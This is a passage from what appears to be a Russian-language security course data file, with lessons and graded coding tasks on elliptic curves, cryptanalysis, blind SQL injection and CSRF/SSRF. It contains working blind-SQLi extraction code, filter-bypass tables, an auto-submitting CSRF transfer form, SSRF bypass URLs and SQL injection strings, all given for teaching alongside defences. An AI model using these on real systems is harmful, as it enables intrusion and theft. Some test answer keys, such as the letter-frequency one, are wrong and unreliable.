    return (x3, y3)

def scalar_mult(k, P, a, p):
    """Скалярное умножение: k * P методом double-and-add."""
    result = None
    addend = P
    while k > 0:
        if k & 1:
            result = point_add(result, addend, a, p)
        addend = point_add(addend, addend, a, p)
        k >>= 1
    return result
\`\`\`

## ECDH — обмен ключами

Аналог Диффи-Хеллмана на эллиптических кривых:

\`\`\`python
# Параметры кривой: a, b, p, G (базовая точка), n (порядок)
# Алиса: секретный ключ d_A, публичный Q_A = d_A * G
# Боб:   секретный ключ d_B, публичный Q_B = d_B * G
# Общий секрет: d_A * Q_B = d_B * Q_A = d_A * d_B * G

def ecdh_shared_secret(private_key, other_public_key, a, p):
    """Вычисляет общий секрет ECDH."""
    shared_point = scalar_mult(private_key, other_public_key, a, p)
    return shared_point[0]  # x-координата как общий секрет

# Пример на малой кривой y² = x³ + 2x + 3 mod 97
a, b, p = 2, 3, 97
G = (3, 6)  # базовая точка

d_A = 7   # секрет Алисы
d_B = 11  # секрет Боба

Q_A = scalar_mult(d_A, G, a, p)
Q_B = scalar_mult(d_B, G, a, p)

secret_A = ecdh_shared_secret(d_A, Q_B, a, p)
secret_B = ecdh_shared_secret(d_B, Q_A, a, p)
assert secret_A == secret_B  # Общий секрет совпадает!
\`\`\`

## ECDSA — цифровая подпись

Подписание:
1. Выбираем случайное k, вычисляем R = k * G
2. r = R.x mod n
3. s = k⁻¹ * (hash(msg) + r * d) mod n
4. Подпись: (r, s)

Проверка:
1. u1 = hash(msg) * s⁻¹ mod n
2. u2 = r * s⁻¹ mod n
3. Проверяем: (u1*G + u2*Q).x ≡ r (mod n)

## Стандартные кривые

- **secp256k1** — Bitcoin, Ethereum
- **P-256 (secp256r1)** — TLS, общее назначение
- **Curve25519** — Signal, WireGuard, SSH
- **Ed25519** — подписи (EdDSA)

## Уязвимости ECC

- **Слабый генератор k в ECDSA** — утечка приватного ключа (Sony PS3, 2010)
- **Invalid curve attack** — точка не на кривой
- **Twist attacks** — использование twisted curve`,
    duration: 60,
    assignments: [
      {
        title: 'Операции на эллиптической кривой',
        description: 'Реализуйте сложение точек и скалярное умножение на эллиптической кривой y² = x³ + ax + b mod p. На вход: a, p (через пробел), затем команда: "add x1 y1 x2 y2" или "mul k x y". Для точки на бесконечности выведите "INF". Иначе выведите x y через пробел.',
        difficulty: 'hard' as const,
        starterCode: 'def point_add(P, Q, a, p):\n    pass\n\ndef scalar_mult(k, P, a, p):\n    pass\n\na, p = map(int, input().split())\ncmd = input().split()\nif cmd[0] == "add":\n    x1, y1, x2, y2 = int(cmd[1]), int(cmd[2]), int(cmd[3]), int(cmd[4])\n    r = point_add((x1,y1), (x2,y2), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\nelse:\n    k, x, y = int(cmd[1]), int(cmd[2]), int(cmd[3])\n    r = scalar_mult(k, (x,y), a, p)\n    print("INF" if r is None else f"{r[0]} {r[1]}")\n',
        testCases: [
          { input: '2 97\nadd 3 6 3 6', expectedOutput: '80 10', description: 'Удвоение точки (3,6) на кривой y²=x³+2x+b mod 97' },
          { input: '2 97\nmul 7 3 6', expectedOutput: '82 6', description: '7*(3,6) на кривой y²=x³+2x+b mod 97' },
          { input: '0 23\nadd 0 0 1 5', expectedOutput: '17 3', description: 'Сложение (0,0)+(1,5) на y²=x³+0x+b mod 23' },
        ],
        points: 25,
      },
      {
        title: 'Модульное обратное число',
        description: 'Реализуйте функцию mod_inverse(a, p), которая возвращает обратное число a по модулю p (то есть x такое, что a*x ≡ 1 mod p). Используйте расширенный алгоритм Евклида или малую теорему Ферма. На вход: T тестов, каждый — a и p через пробел.',
        difficulty: 'easy' as const,
        starterCode: 'def mod_inverse(a: int, p: int) -> int:\n    # Верните обратное число a по модулю p\n    pass\n\nt = int(input())\nfor _ in range(t):\n    a, p = map(int, input().split())\n    print(mod_inverse(a, p))\n',
        testCases: [
          { input: '3\n3 7\n2 11\n5 13', expectedOutput: '5\n6\n8', description: '3*5=15≡1(mod7), 2*6=12≡1(mod11), 5*8=40≡1(mod13)' },
          { input: '2\n1 97\n96 97', expectedOutput: '1\n96', description: '1 обратен сам себе; 96≡-1, (-1)*(-1)=1' },
        ],
        points: 10,
      },
      {
        title: 'Проверка точки на кривой',
        description: 'Реализуйте функцию is_on_curve(x, y, a, b, p), которая проверяет, лежит ли точка (x,y) на кривой y² ≡ x³ + ax + b (mod p). Верните YES или NO. На вход: T тестов, каждый — x y a b p через пробел.',
        difficulty: 'easy' as const,
        starterCode: 'def is_on_curve(x: int, y: int, a: int, b: int, p: int) -> str:\n    # Проверьте: y^2 mod p == (x^3 + a*x + b) mod p\n    pass\n\nt = int(input())\nfor _ in range(t):\n    x, y, a, b, p = map(int, input().split())\n    print(is_on_curve(x, y, a, b, p))\n',
        testCases: [
          { input: '3\n3 6 2 3 97\n0 0 0 0 23\n1 1 1 1 5', expectedOutput: 'YES\nYES\nNO', description: '(3,6): 36≡(27+6+3)mod97=36 YES; (0,0): 0≡0 YES; (1,1): 1≡3mod5=3 NO' },
          { input: '2\n5 1 0 7 11\n2 4 0 7 11', expectedOutput: 'YES\nYES', description: 'Точки на кривой secp-подобной y²=x³+7 mod 11' },
        ],
        points: 10,
      },
      {
        title: 'Нахождение порядка точки',
        description: 'Реализуйте функцию point_order(x, y, a, p), которая возвращает порядок точки (x,y) на кривой y²=x³+ax+b mod p — наименьшее n такое, что n*(x,y)=INF. Ограничение: n <= 200. Если не найдено — верните -1.',
        difficulty: 'medium' as const,
        starterCode: 'def point_add(P, Q, a, p):\n    # Реализуйте сложение точек\n    pass\n\ndef point_order(x: int, y: int, a: int, p: int) -> int:\n    # Найдите порядок точки\n    pass\n\nx, y, a, p = map(int, input().split())\nprint(point_order(x, y, a, p))\n',
        testCases: [
          { input: '0 0 0 23', expectedOutput: '2', description: '(0,0) — порядок 2 (P + P = INF, т.к. y=0)' },
          { input: '3 6 2 97', expectedOutput: '5', description: '5*(3,6)=INF на y²=x³+2x+b mod 97' },
        ],
        points: 15,
      },
      {
        title: 'Генерация общего секрета ECDH',
        description: 'Реализуйте упрощённый протокол ECDH. На вход: a p (параметры кривой), G_x G_y (генератор), private_a (секретный ключ Алисы), public_b_x public_b_y (публичный ключ Боба). Вычислите shared_secret = private_a * PublicB. Выведите x y общего секрета.',
        difficulty: 'medium' as const,
        starterCode: 'def point_add(P, Q, a, p):\n    # Сложение точек\n    pass\n\ndef scalar_mult(k, P, a, p):\n    # Скалярное умножение\n    pass\n\na_param, p = map(int, input().split())\ngx, gy = map(int, input().split())\npriv_a = int(input())\npub_bx, pub_by = map(int, input().split())\nresult = scalar_mult(priv_a, (pub_bx, pub_by), a_param, p)\nprint(f"{result[0]} {result[1]}" if result else "INF")\n',
        testCases: [
          { input: '2 97\n3 6\n2\n80 10', expectedOutput: '80 10', description: 'Alice: priv=2, Bob pub=(80,10); 2*(80,10) на y²=x³+2x+b mod 97' },
          { input: '2 97\n3 6\n3\n3 6', expectedOutput: '80 87', description: '3*(3,6) = (80,87) на y²=x³+2x+b mod 97' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 5: Криптоанализ
  // ──────────────────────────────────────────
  {
    slug: 'cipher-analysis',
    title: 'Криптоанализ',
    description: 'Known-plaintext, chosen-ciphertext, meet-in-the-middle, birthday attack',
    content: `# Криптоанализ: методы атак на шифры

## Классификация атак

| Тип атаки | Что знает атакующий |
|-----------|-------------------|
| Ciphertext-only | Только шифротексты |
| Known-plaintext | Пары (открытый, шифротекст) |
| Chosen-plaintext | Может шифровать свои данные |
| Chosen-ciphertext | Может расшифровывать свои данные |
| Related-key | Связь между ключами |

## Meet-in-the-Middle (MITM)

Атака на **двойное шифрование** (2DES, 2AES). Вместо \`2^(2n)\` — всего \`2^(n+1)\`!

### Принцип

Двойное шифрование: \`C = E(K2, E(K1, P))\`

Атака:
1. Шифруем P всеми возможными K1 → таблица \`{E(K1, P): K1}\`
2. Расшифровываем C всеми возможными K2 → ищем совпадение в таблице
3. Совпадение: \`E(K1, P) = D(K2, C)\` → нашли оба ключа

\`\`\`python
def meet_in_the_middle(encrypt_func, decrypt_func, plaintext, ciphertext, key_space):
    """
    MITM-атака на двойное шифрование.
    key_space — итератор всех возможных ключей.
    """
    # Шаг 1: шифруем первым ключом, строим таблицу
    forward_table = {}
    for k1 in key_space:
        intermediate = encrypt_func(k1, plaintext)
        forward_table[intermediate] = k1

    # Шаг 2: расшифровываем вторым ключом, ищем совпадение
    for k2 in key_space:
        intermediate = decrypt_func(k2, ciphertext)
        if intermediate in forward_table:
            k1 = forward_table[intermediate]
            return k1, k2

    return None
\`\`\`

## Birthday Attack

Основан на **парадоксе дней рождения**: в группе из 23 человек вероятность совпадения дней рождения > 50%.

Для хеша длиной n бит нужно ~\`2^(n/2)\` вычислений для нахождения коллизии.

\`\`\`python
import hashlib
import random

def birthday_attack(hash_func, hash_bits, prefix_bits=None):
    """
    Ищет коллизию хеш-функции.
    Сравниваем первые prefix_bits бит хеша.
    """
    if prefix_bits is None:
        prefix_bits = hash_bits
    mask = (1 << prefix_bits) - 1
    seen = {}
    attempts = 0

    while True:
        msg = random.randbytes(16)
        h = int(hash_func(msg).hexdigest(), 16) & mask
        attempts += 1

        if h in seen and seen[h] != msg:
            return seen[h], msg, attempts
        seen[h] = msg

# Демонстрация: коллизия по первым 24 битам SHA-256
# Ожидаемо ~2^12 = 4096 попыток
msg1, msg2, n = birthday_attack(hashlib.sha256, 256, prefix_bits=24)
print(f"Коллизия найдена за {n} попыток")
\`\`\`

## Known-Plaintext атака на XOR-шифр

Если шифрование \`C = P XOR K\` и известна пара (P, C):

\`\`\`python
def recover_xor_key(plaintext: bytes, ciphertext: bytes) -> bytes:
    """Восстанавливает ключ XOR-шифра по известной паре."""
    return bytes(p ^ c for p, c in zip(plaintext, ciphertext))

# Если ключ короче сообщения, он повторяется:
def crack_repeating_xor(ciphertext: bytes, known_plaintext: bytes,
                         known_offset: int) -> bytes:
    """Восстанавливает повторяющийся XOR-ключ."""
    partial_key = recover_xor_key(
        known_plaintext,
        ciphertext[known_offset:known_offset+len(known_plaintext)]
    )
    # Определяем длину ключа по периодичности
    for key_len in range(1, len(partial_key) + 1):
        if len(partial_key) % key_len == 0:
            key = partial_key[:key_len]
            if all(partial_key[i] == key[i % key_len]
                   for i in range(len(partial_key))):
                return key
    return partial_key
\`\`\`

## Дифференциальный криптоанализ

Анализирует, как **разности** входов влияют на **разности** выходов через S-боксы.

## Линейный криптоанализ

Ищет **линейные аппроксимации** связи между битами входа, выхода и ключа.

## Практические рекомендации

- Никогда не придумывайте свою криптографию!
- Используйте проверенные алгоритмы: AES-256, ChaCha20, SHA-3
- Ключи должны быть достаточной длины
- Всегда используйте authenticated encryption`,
    duration: 55,
    assignments: [
      {
        title: 'Meet-in-the-Middle атака',
        description: 'Реализуйте MITM-атаку на «двойной XOR-шифр». Шифрование: C = (P XOR K1) XOR K2, где K1 и K2 — однобайтные ключи (0-255). Дан открытый текст P (целое число 0-255) и шифротекст C (целое число 0-255). Найдите K1 и K2 (наименьшую пару в лексикографическом порядке). Выведите K1 K2 через пробел.',
        difficulty: 'hard' as const,
        starterCode: 'def mitm_xor(P: int, C: int) -> tuple:\n    # Найдите K1, K2 такие что (P ^ K1) ^ K2 == C\n    # Верните наименьшую пару (K1, K2)\n    pass\n\nP, C = map(int, input().split())\nk1, k2 = mitm_xor(P, C)\nprint(k1, k2)\n',
        testCases: [
          { input: '65 90', expectedOutput: '0 27', description: 'P=65, C=90: K1=0, K2=27 (65^0=65, 65^27=90)' },
          { input: '0 0', expectedOutput: '0 0', description: 'P=0, C=0: K1=0, K2=0 (0^0^0=0)' },
          { input: '255 0', expectedOutput: '0 255', description: 'P=255, C=0: K1=0, K2=255 (255^0=255, 255^255=0)' },
          { input: '100 200', expectedOutput: '0 172', description: 'P=100, C=200: минимальная пара K1=0, K2=172' },
        ],
        points: 25,
      },
      {
        title: 'Частотный анализ текста',
        description: 'Реализуйте функцию freq_analysis(text), которая подсчитывает частоту каждой буквы (a-z, регистронезависимо) и выводит топ-3 самых частых букв с их процентами (округлять до 1 знака). Формат вывода: "БУКВА:ПРОЦЕНТ%". Сортировка по убыванию частоты, при равенстве — по алфавиту.',
        difficulty: 'easy' as const,
        starterCode: 'def freq_analysis(text: str) -> list:\n    # Подсчитайте частоту букв a-z\n    # Верните топ-3 как список (буква, процент)\n    pass\n\ntext = input()\nfor letter, pct in freq_analysis(text):\n    print(f"{letter}:{pct}%")\n',
        testCases: [
          { input: 'Hello World', expectedOutput: 'l:30.0%\nd:10.0%\ne:10.0%', description: 'H=1,e=1,l=3,o=2,W=1,r=1,d=1; всего 10; l=30%, d,e,h,o,r,w — при равных по алфавиту' },
          { input: 'aaabbc', expectedOutput: 'a:50.0%\nb:33.3%\nc:16.7%', description: 'a=3(50%), b=2(33.3%), c=1(16.7%)' },
        ],
        points: 10,
      },
      {
        title: 'Индекс совпадения',
        description: 'Реализуйте функцию index_of_coincidence(text). IC = сумма(fi*(fi-1)) / (N*(N-1)), где fi — количество вхождений i-й буквы, N — общее число букв. Считайте только a-z (регистронезависимо). Выведите IC с 4 знаками после запятой.',
        difficulty: 'easy' as const,
        starterCode: 'def index_of_coincidence(text: str) -> float:\n    # Вычислите индекс совпадения\n    # Только буквы a-z (приведите к нижнему регистру)\n    pass\n\ntext = input()\nprint(f"{index_of_coincidence(text):.4f}")\n',
        testCases: [
          { input: 'AAAA', expectedOutput: '1.0000', description: 'Все одинаковые: 4*3/(4*3)=1.0' },
          { input: 'ABCDEF', expectedOutput: '0.0000', description: 'Все разные: каждая fi=1, fi*(fi-1)=0' },
          { input: 'AABBCC', expectedOutput: '0.2000', description: 'A=2,B=2,C=2: 3*(2*1)/(6*5)=6/30=0.2' },
        ],
        points: 10,
      },
      {
        title: 'Подбор ключа однобайтного XOR',
        description: 'Реализуйте функцию crack_single_xor(hex_ciphertext). Дан шифротекст (hex), зашифрованный XOR с одним байтом-ключом (0-255). Переберите все ключи и найдите тот, при котором результат содержит максимум печатных ASCII (32-126). Выведите ключ (десятичное) и расшифрованный текст через перевод строки.',
        difficulty: 'medium' as const,
        starterCode: 'def crack_single_xor(hex_ct: str) -> tuple:\n    # Переберите ключи 0-255\n    # Верните (ключ, открытый_текст)\n    pass\n\nhex_ct = input().strip()\nkey, plaintext = crack_single_xor(hex_ct)\nprint(key)\nprint(plaintext)\n',
        testCases: [
          { input: '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736', expectedOutput: '88\nSecrets are no fun without someone', description: 'XOR с ключом 88 даёт текст на английском' },
          { input: '29292929', expectedOutput: '0\n))))', description: 'Ключ 0: шифротекст = открытый текст, 0x29=")"' },
        ],
        points: 15,
      },
      {
        title: 'Birthday paradox: вероятность коллизии',
        description: 'Реализуйте функцию birthday_prob(n, d), которая вычисляет вероятность хотя бы одной коллизии среди n элементов из d возможных значений. Формула: P = 1 - product((d-i)/d для i в 0..n-1). Выведите вероятность с 6 знаками после запятой.',
        difficulty: 'medium' as const,
        starterCode: 'def birthday_prob(n: int, d: int) -> float:\n    # Вычислите вероятность коллизии\n    # n — количество элементов, d — размер пространства\n    pass\n\nt = int(input())\nfor _ in range(t):\n    n, d = map(int, input().split())\n    print(f"{birthday_prob(n, d):.6f}")\n',
        testCases: [
          { input: '2\n23 365\n50 365', expectedOutput: '0.507297\n0.970374', description: '23 человека: ~50.7% коллизии, 50 — ~97%' },
          { input: '2\n2 10\n1 100', expectedOutput: '0.100000\n0.000000', description: '2 из 10: 10% коллизии, 1 элемент — 0%' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 6: Blind SQL Injection
  // ──────────────────────────────────────────
  {
    slug: 'blind-sql-injection',
    title: 'Blind SQL Injection',
    description: 'Boolean-based и time-based слепые SQL-инъекции, автоматизация извлечения данных',
    content: `# Blind SQL Injection

## Отличие от классической SQL-инъекции

В **классической** SQLi данные отображаются на странице. В **слепой** — нет прямого вывода. Атакующий задаёт вопросы «да/нет» и по поведению сервера узнаёт ответ.

## Boolean-Based Blind SQLi

Сервер отвечает по-разному в зависимости от истинности условия:

\`\`\`
GET /user?id=1 AND 1=1   → страница нормальная (TRUE)
GET /user?id=1 AND 1=2   → страница другая / ошибка (FALSE)
\`\`\`

### Извлечение данных побитово

\`\`\`python
def extract_char_boolean(inject_func, position: int, query: str) -> str:
    """
    Извлекает один символ из результата SQL-запроса.
    inject_func(condition) -> True/False
    """
    low, high = 32, 126  # ASCII printable
    while low < high:
        mid = (low + high) // 2
        # SQL: ASCII(SUBSTRING((query), position, 1)) > mid
        condition = f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"
        if inject_func(condition):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract_string_boolean(inject_func, query: str, max_len: int = 100) -> str:
    """Извлекает строку побайтово через boolean blind SQLi."""
    result = ""
    for pos in range(1, max_len + 1):
        char = extract_char_boolean(inject_func, pos, query)
        if char == ' ' or ord(char) < 32:
            break
        result += char
    return result

# Пример: извлечение имени текущей БД
# db_name = extract_string_boolean(inject, "SELECT database()")
\`\`\`

## Time-Based Blind SQLi

Когда нет визуальной разницы, используем **задержку**:

\`\`\`python
import time
import requests

def time_based_inject(url: str, condition: str, delay: float = 2.0) -> bool:
    """
    Time-based blind SQLi.
    Возвращает True, если условие истинно (сервер задержал ответ).
    """
    # MySQL: IF(condition, SLEEP(delay), 0)
    payload = f"1 AND IF({condition}, SLEEP({delay}), 0)"
    start = time.time()
    requests.get(url, params={"id": payload})
    elapsed = time.time() - start
    return elapsed >= delay * 0.8  # допуск на сеть

def extract_char_time(url: str, position: int, query: str) -> str:
    """Извлекает символ через time-based SQLi."""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"
        if time_based_inject(url, condition):
            low = mid + 1
        else:
            high = mid
    return chr(low)
\`\`\`

## Техники оптимизации

### Бинарный поиск vs побитовый

Бинарный поиск: ~7 запросов на символ (log2(95) ≈ 6.6)

Побитовый (по битам ASCII): ровно 7 запросов, но проще в реализации:

\`\`\`python
def extract_char_bitwise(inject_func, position: int, query: str) -> str:
    """Извлекает символ побитово (7 бит ASCII)."""
    char_val = 0
    for bit in range(6, -1, -1):
        condition = f"ASCII(SUBSTRING(({query}),{position},1))&{1<<bit}>{0}"
        if inject_func(condition):
            char_val |= (1 << bit)
    return chr(char_val)
\`\`\`

## Обход фильтров

| Фильтр | Обход |
|--------|-------|
| Пробелы | \`/**/\`, \`%09\`, \`%0a\` |
| Кавычки | \`CHAR()\`, hex-литералы |
| AND/OR | \`&&\`, \`||\\| |
| SELECT | \`SeLeCt\`, двойная запись |
| UNION | \`UNI/**/ON\` |
| = | \`LIKE\`, \`IN()\`, \`BETWEEN\` |

## Защита

1. **Параметризованные запросы** (prepared statements)
2. **ORM** с правильным использованием
3. **WAF** (Web Application Firewall) как дополнительный слой
4. **Минимальные привилегии** БД-пользователя
5. **Мониторинг** аномальных запросов`,
    duration: 55,
    assignments: [
      {
        title: 'Симуляция boolean-based blind SQLi',
        description: 'Реализуйте функцию binary_search_char(responses), которая по массиву ответов oracle (True/False) восстанавливает ASCII-символ. Алгоритм: бинарный поиск в диапазоне [32, 126]. На каждом шаге mid = (low+high)//2; если ответ True — символ > mid (low=mid+1), иначе high=mid. На вход: первая строка — количество символов N, далее N блоков: каждый блок — последовательность ответов (1/0 через пробел) для одного символа. Выведите восстановленную строку.',
        difficulty: 'hard' as const,
        starterCode: 'def binary_search_char(responses: list) -> str:\n    low, high = 32, 126\n    for r in responses:\n        mid = (low + high) // 2\n        if r:\n            low = mid + 1\n        else:\n            high = mid\n    return chr(low)\n\nn = int(input())\nresult = ""\nfor _ in range(n):\n    bits = list(map(int, input().split()))\n    result += binary_search_char([b == 1 for b in bits])\nprint(result)\n',
        testCases: [
          { input: '3\n1 0 1 0 1 1 0\n1 0 1 1 0 0 0\n1 1 0 0 1 0 1', expectedOutput: 'abc', description: 'Три символа: a(97), b(98), c(99)' },
          { input: '1\n0 1 0 0 0 0 0', expectedOutput: 'A', description: 'Один символ: A(65)' },
          { input: '5\n0 0 1 0 0 0 0\n1 0 1 0 0 1 0\n1 0 1 0 1 1 0\n1 0 1 0 1 1 0\n1 0 1 1 1 1 1', expectedOutput: 'Hello', description: 'Слово Hello' },
        ],
        points: 25,
      },
      {
        title: 'Определение уязвимости SQL-запроса',
        description: 'Реализуйте функцию is_sqli_vulnerable(query), которая проверяет SQL-запрос на признаки SQL-инъекции. Запрос уязвим если: пользовательский ввод (обозначен как {input}) конкатенируется напрямую в строку запроса без параметризации. Верните VULNERABLE или SAFE. На вход: N запросов.',
        difficulty: 'easy' as const,
        starterCode: 'def is_sqli_vulnerable(query: str) -> str:\n    # Проверьте, содержит ли запрос прямую конкатенацию {input}\n    # Если {input} внутри кавычек в WHERE — VULNERABLE\n    # Если используется ? или %s — SAFE\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(is_sqli_vulnerable(input().strip()))\n',
        testCases: [
          { input: "3\nSELECT * FROM users WHERE name = '{input}'\nSELECT * FROM users WHERE name = ?\nSELECT * FROM users WHERE id = {input}", expectedOutput: 'VULNERABLE\nSAFE\nVULNERABLE', description: 'Прямая подстановка — уязвимо, параметр ? — безопасно' },
          { input: "2\nSELECT * FROM items WHERE price > %s\nSELECT * FROM items ORDER BY {input}", expectedOutput: 'SAFE\nVULNERABLE', description: '%s — параметризованный, ORDER BY с {input} — уязвим' },
        ],
        points: 10,
      },
      {
        title: 'Экранирование спецсимволов SQL',
        description: 'Реализуйте функцию escape_sql(user_input), которая экранирует опасные символы для SQL: одинарная кавычка (\') → \'\', обратный слэш (\\) → \\\\, точка с запятой (;) → удалить, двойной дефис (--) → удалить. На вход: N строк.',
        difficulty: 'easy' as const,
        starterCode: 'def escape_sql(user_input: str) -> str:\n    # Экранируйте спецсимволы SQL\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(escape_sql(input()))\n',
        testCases: [
          { input: "3\nadmin' OR '1'='1\nnormal_input\ntest; DROP TABLE users--", expectedOutput: "admin'' OR ''1''=''1\nnormal_input\ntest DROP TABLE users", description: 'Кавычки удваиваются, ; и -- удаляются' },
          { input: "2\nhello\\world\na'b\\c;d--e", expectedOutput: "hello\\\\world\na''b\\\\cde", description: 'Обратный слэш удваивается, комбинированный тест' },
        ],
        points: 10,
      },
      {
        title: 'Генератор UNION-based SQL payload',
        description: 'Реализуйте функцию generate_union_payload(num_columns, target_column). Генерирует UNION SELECT payload, где target_column содержит "@@version", а остальные — NULL. num_columns — количество столбцов в оригинальном запросе (1-10). target_column — номер столбца для @@version (1-indexed). Формат: "\' UNION SELECT NULL,@@version,NULL--".',
        difficulty: 'medium' as const,
        starterCode: 'def generate_union_payload(num_columns: int, target_column: int) -> str:\n    # Сгенерируйте UNION SELECT payload\n    pass\n\nt = int(input())\nfor _ in range(t):\n    n, tc = map(int, input().split())\n    print(generate_union_payload(n, tc))\n',
        testCases: [
          { input: '3\n3 2\n1 1\n5 3', expectedOutput: "' UNION SELECT NULL,@@version,NULL--\n' UNION SELECT @@version--\n' UNION SELECT NULL,NULL,@@version,NULL,NULL--", description: '3 столбца с @@version на 2-м, 1 столбец, 5 столбцов с @@version на 3-м' },
          { input: '1\n4 4', expectedOutput: "' UNION SELECT NULL,NULL,NULL,@@version--", description: '4 столбца, @@version в последнем' },
        ],
        points: 15,
      },
      {
        title: 'Подсчёт запросов для blind SQLi',
        description: 'При binary search blind SQLi для извлечения одного символа ASCII (32-126) нужно ceil(log2(95)) = 7 запросов. Реализуйте функцию calc_requests(string_length, charset_size), которая возвращает общее число запросов для извлечения строки длины string_length с заданным размером алфавита. Формула: string_length * ceil(log2(charset_size)).',
        difficulty: 'medium' as const,
        starterCode: 'import math\n\ndef calc_requests(string_length: int, charset_size: int) -> int:\n    # Вычислите количество запросов для blind SQLi\n    pass\n\nt = int(input())\nfor _ in range(t):\n    sl, cs = map(int, input().split())\n    print(calc_requests(sl, cs))\n',
        testCases: [
          { input: '3\n10 95\n32 256\n1 2', expectedOutput: '70\n256\n1', description: '10*7=70, 32*8=256, 1*1=1' },
          { input: '2\n5 128\n20 36', expectedOutput: '35\n120', description: '5*7=35, 20*ceil(log2(36))=20*6=120' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 7: CSRF и SSRF
  // ──────────────────────────────────────────
  {
    slug: 'csrf-ssrf',
    title: 'CSRF и SSRF',
    description: 'Межсайтовая подделка запросов, серверная подделка запросов, обход фильтров',
    content: `# CSRF и SSRF

## CSRF — Cross-Site Request Forgery

**CSRF** заставляет браузер жертвы отправить запрос к уязвимому сайту, используя авторизацию жертвы.

### Как работает CSRF

1. Жертва авторизована на \`bank.com\` (cookie сохранены в браузере)
2. Жертва посещает \`evil.com\`
3. \`evil.com\` содержит:
\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
\`\`\`
4. Браузер автоматически отправляет cookie \`bank.com\` → перевод выполнен!

### Генерация CSRF-атаки

\`\`\`python
def generate_csrf_form(target_url: str, params: dict, method: str = "POST") -> str:
    """Генерирует HTML-страницу с автоматической CSRF-формой."""
    inputs = ""
    for name, value in params.items():
        inputs += f'<input type="hidden" name="{name}" value="{value}">\n'
    return f"""<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="{target_url}" method="{method}">
{inputs}
</form>
</body>
</html>"""

# Пример
csrf_html = generate_csrf_form(
    "https://bank.com/api/transfer",
    {"to": "attacker", "amount": "10000", "currency": "RUB"}
)
\`\`\`

### Защита от CSRF

1. **CSRF-токены** — уникальный токен в каждой форме
2. **SameSite cookies** — \`Set-Cookie: session=abc; SameSite=Strict\`
3. **Проверка Origin/Referer** заголовков
4. **Двойная отправка cookie** (Double Submit Cookie)

\`\`\`python
import secrets
import hmac

def generate_csrf_token(session_id: str, secret: str) -> str:
    """Генерирует CSRF-токен, привязанный к сессии."""
    return hmac.new(
        secret.encode(), session_id.encode(), 'sha256'
    ).hexdigest()

def verify_csrf_token(token: str, session_id: str, secret: str) -> bool:
    """Проверяет CSRF-токен."""
    expected = generate_csrf_token(session_id, secret)
    return hmac.compare_digest(token, expected)
\`\`\`

## SSRF — Server-Side Request Forgery

**SSRF** заставляет **сервер** делать запросы к произвольным адресам.

### Типичные сценарии

\`\`\`
GET /fetch?url=http://internal-api:8080/admin/users
GET /preview?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
GET /proxy?url=http://localhost:6379/  (Redis)
\`\`\`

### Обход фильтров SSRF

\`\`\`python
def generate_ssrf_bypasses(target_ip: str = "127.0.0.1") -> list:
    """Генерирует варианты обхода SSRF-фильтров для localhost."""
    bypasses = [
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://localhost",
        "http://[::1]",         # IPv6 loopback
        "http://0x7f000001",    # hex IP
        "http://2130706433",    # decimal IP
        "http://017700000001",  # octal IP
        "http://127.1",         # сокращённый IP
        "http://127.0.0.1.nip.io",  # DNS rebinding
        "http://0177.0.0.1",   # octal первый октет
        "http://127.0.0.1%00@evil.com",  # null byte
        "http://evil.com@127.0.0.1",     # basic auth trick
    ]
    return bypasses
\`\`\`

### Защита от SSRF

1. **Белый список** допустимых URL/доменов
2. **Блокировка** приватных IP-диапазонов (10.x, 172.16-31.x, 192.168.x)
3. **DNS-резолвинг** до запроса (проверка что IP не приватный)
4. **Отключение редиректов** или их валидация
5. **Сетевая сегментация** — сервер не должен иметь доступ к внутренним сервисам

\`\`\`python
import ipaddress
from urllib.parse import urlparse
import socket

def is_safe_url(url: str) -> bool:
    """Проверяет URL на SSRF (не приватный IP)."""
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    try:
        ip = socket.gethostbyname(parsed.hostname)
        addr = ipaddress.ip_address(ip)
        return not (addr.is_private or addr.is_loopback
                    or addr.is_link_local or addr.is_reserved)
    except (socket.gaierror, ValueError):
        return False
\`\`\`

## Реальные CVE

- **CVE-2019-5464** — GitLab SSRF через импорт проектов
- **Capital One breach (2019)** — SSRF к AWS metadata → утечка 100M записей
- **CVE-2020-8135** — SSRF в Node.js http модуле`,
    duration: 55,
    assignments: [
      {
        title: 'Валидатор URL для защиты от SSRF',
        description: 'Реализуйте функцию is_ssrf_safe(url), которая возвращает True если URL безопасен и False если URL может быть SSRF-атакой. URL небезопасен если: 1) хост — IP из приватных диапазонов (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8), 2) хост — "localhost", 3) схема не http/https, 4) URL содержит "@" перед хостом. На вход: N URL, по одному на строку.',
        difficulty: 'hard' as const,
        starterCode: 'def is_ssrf_safe(url: str) -> bool:\n    # Верните True если URL безопасен, False если SSRF\n    pass\n\nn = int(input())\nfor _ in range(n):\n    url = input().strip()\n    print("SAFE" if is_ssrf_safe(url) else "BLOCKED")\n',
        testCases: [
          { input: '4\nhttps://google.com/api\nhttp://127.0.0.1/admin\nhttp://192.168.1.1:8080/secret\nftp://example.com/file', expectedOutput: 'SAFE\nBLOCKED\nBLOCKED\nBLOCKED', description: 'Внешний HTTPS — ok, localhost — blocked, приватный IP — blocked, ftp — blocked' },
          { input: '3\nhttp://10.0.0.1/metadata\nhttp://evil.com@127.0.0.1/admin\nhttp://172.16.0.1/', expectedOutput: 'BLOCKED\nBLOCKED\nBLOCKED', description: 'Приватный 10.x, @ в URL, приватный 172.16.x' },
          { input: '3\nhttps://api.example.com/data\nhttp://8.8.8.8/dns\nhttp://localhost/internal', expectedOutput: 'SAFE\nSAFE\nBLOCKED', description: 'Внешние адреса safe, localhost blocked' },
        ],
        points: 25,
      },
